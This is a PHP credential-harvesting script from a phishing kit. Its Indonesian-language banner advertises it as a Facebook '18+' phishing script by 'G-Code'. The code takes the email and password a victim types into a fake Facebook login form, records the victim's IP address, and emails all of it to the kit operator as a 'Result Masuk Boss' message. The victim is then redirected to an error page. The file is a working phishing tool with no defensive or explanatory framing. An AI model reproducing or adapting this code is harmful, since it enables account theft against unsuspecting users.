<!--
Delete/Change Copyright? You are IDIOT
 ______________________________________________
|                                              |
|            CLOUD HOSTING LIVE                |
|      Script Phising 18+ Lock Country         |
|         www.cloudhostinglive.com             |
|               2020 © G-Code                  |
|______________________________________________|

-->

<?php
include 'gcode.php';

$user = $_POST['email'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

$subject = "Result Facebook 18+ si [ $user ]";
$message = '
<center> 
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Detail Korban</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP Address</th>
<th style="width: 78%; text-align: center;"><b>'.$ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Negara</th>
<th style="width: 78%; text-align: center;"><b>INDONESIA 🇮🇩</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Email/No Telp/Username</th>
<th style="width: 78%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Password</th>
<th style="width: 78%; text-align: center;"><b>'.$pass.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Login</th>
<th style="width: 78%; text-align: center;"><b>FACEBOOK</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya: g-code.web.id
</div>
<div style="float: right;">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/M5LvZfK/fb.png">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/k1fsCW3/ig.png">
<img style="margin: 5px;" width="30" src="https://i.ibb.co/xLgTdXs/twitter.png">
</div>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: Result Masuk Boss <result@g-code.co.id>' . "\r\n";
$datamail = mail($gifan, $subject, $message, $headersx);
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="REFRESH" content="0;error">
</head>
<body>
</body>
</html>


<!--
Delete/Change Copyright? You are IDIOT
 ______________________________________________
|                                              |
|            CLOUD HOSTING LIVE                |
|      Script Phising 18+ Lock Country         |
|         www.cloudhostinglive.com             |
|               2020 © G-Code                  |
|______________________________________________|

-->